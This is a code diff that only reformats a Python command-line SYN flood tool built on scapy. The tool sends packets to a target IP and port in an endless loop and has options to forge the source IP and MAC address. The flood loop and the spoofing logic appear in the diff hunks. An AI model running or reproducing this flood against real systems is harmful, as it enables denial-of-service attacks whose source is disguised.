@@ -12,13 +12,27 @@ from scapy.all import IP, TCP, Ether, RandMAC, conf, sendp
 
 
 @click.command()
-@click.argument('ip')
-@click.option('-i', 'interface', default=None, help='Wich interface to use (default: auto)')
-@click.option('-c', 'count', default=0, help='How many packets send (default: infinit)')
-@click.option('-p', 'port', default=135, help='Port to use (default: 135)')
-@click.option('-2', 'forgemac', is_flag=True, default=False, help='Forge layer2/MAC address (default: No)')
-@click.option('-3', 'forgeip', is_flag=True, default=False, help='Forge layer3/IP address (default: No)')
-@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
+@click.argument("ip")
+@click.option(
+    "-i", "interface", default=None, help="Wich interface to use (default: auto)"
+)
+@click.option("-c", "count", default=0, help="How many packets send (default: infinit)")
+@click.option("-p", "port", default=135, help="Port to use (default: 135)")
+@click.option(
+    "-2",
+    "forgemac",
+    is_flag=True,
+    default=False,
+    help="Forge layer2/MAC address (default: No)",
+)
+@click.option(
+    "-3",
+    "forgeip",
+    is_flag=True,
+    default=False,
+    help="Forge layer3/IP address (default: No)",
+)
+@click.option("-v", "verbose", is_flag=True, default=False, help="Verbose")
 def cmd_tcp_synflood(ip, interface, count, port, forgemac, forgeip, verbose):
     """Launch a lot of TCP connections and keeps them opened.
 
@@ -68,7 +82,10 @@ def cmd_tcp_synflood(ip, interface, count, port, forgemac, forgeip, verbose):
 
     while True:
         if forgeip:
-            pkt[IP].src = "%s.%s" %(pkt[IP].src.rsplit('.', maxsplit=1)[0], randint(1, 254))
+            pkt[IP].src = "%s.%s" % (
+                pkt[IP].src.rsplit(".", maxsplit=1)[0],
+                randint(1, 254),
+            )
         if forgemac:
             pkt[Ether].src = RandMAC()
 
@@ -77,7 +94,7 @@ def cmd_tcp_synflood(ip, interface, count, port, forgemac, forgeip, verbose):
         if verbose:
             print(pkt.summary())
         else:
-            print('.', end='')
+            print(".", end="")
             sys.stdout.flush()
 
         sendp(pkt)
@@ -88,5 +105,6 @@ def cmd_tcp_synflood(ip, interface, count, port, forgemac, forgeip, verbose):
 
     return True
 
-if __name__ == '__main__':
+
+if __name__ == "__main__":
     cmd_tcp_synflood()
